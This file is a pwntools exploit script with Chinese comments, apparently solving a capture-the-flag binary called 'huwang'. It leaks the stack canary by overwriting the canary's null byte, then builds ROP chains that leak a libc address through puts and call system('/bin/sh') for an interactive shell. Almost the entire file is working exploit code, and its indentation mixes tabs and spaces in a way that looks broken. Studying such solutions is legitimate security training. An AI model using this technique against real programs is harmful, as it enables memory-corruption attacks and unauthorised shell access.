from pwn import *
import time

context.log_level = 'debug'

p = process("./huwang")
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')

def md5(str):
	hash_obj = hashlib.md5()
	hash_obj.update(str)
	return hash_obj.hexdigest()

def six(name,rounds,secret):
	p.recvuntil("command>>")
	p.sendline("666")
	p.recvuntil("please input your name")
	p.send(name)
	p.recvuntil("Do you want to guess the secret?")
	p.sendline("y")
	p.recvuntil("Input how many rounds do you want to encrypt the secret:")

#	gdb.attach(p)
	p.sendline(str(rounds))
	p.recvuntil("Try to guess the md5 of the secret")
	p.send(secret)
 
if __name__=='__main__':#该程序没有开启随机化

	secret = md5('\0'*16)
	secret = secret.decode('hex')#'\0'*16的md5加密值
	
	six('a'*0x19,1,secret) #name在bp-20h处，可以覆盖canary最后的'\x00'截断位来泄露canary的值

	#gdb.attach(p)
	p.recvuntil("occupation?\n")	
	payload = 'c'*0xf0 + '\n'
	p.send(payload)


	p.recvuntil('a'*0x19)
	canary = u64('\x00'+p.recv(7)) #泄露canary的值，进行栈溢出
	print hex(canary)

	p.recvuntil("[Y/N]\n")
	p.sendline('Y')

#	gdb.attach(p)

	shellcode = 'a' * 0x108 + p64(canary) + p64(0xdeadbeef)
    shellcode += p64(0x0000000000401573) + p64(0x0602F70) + p64(0x40101C)#pop rdi ; ret，重新运行vul_func函数，传入puts_got表地址，泄露puts地址
    p.send(shellcode)
    p.recvuntil('Congratulations, ')
    libc_base = u64(p.recv(6).ljust(8,'\0')) - libc.symbols['puts']#获得libc基址

	print hex(libc_base)

	system_addr = libc_base + libc.symbols['system']

	p.recvuntil("occupation?\n")
    payload = 'c'*0xf0 + '\n'
    p.send(payload)

	p.recvuntil("[Y/N]\n")
    p.sendline('Y')

	shellcode = 'a' * 0x108 + p64(canary) + p64(0xdeadbeef)
    shellcode += p64(0x0000000000401573) + p64(next(libc.search('/bin/sh'))+libc_base) + p64(system_addr)
    #pop rdi ; ret，运行system函数，传入"/bin/sh\0"表地址
	p.send(shellcode)

	p.interactive()
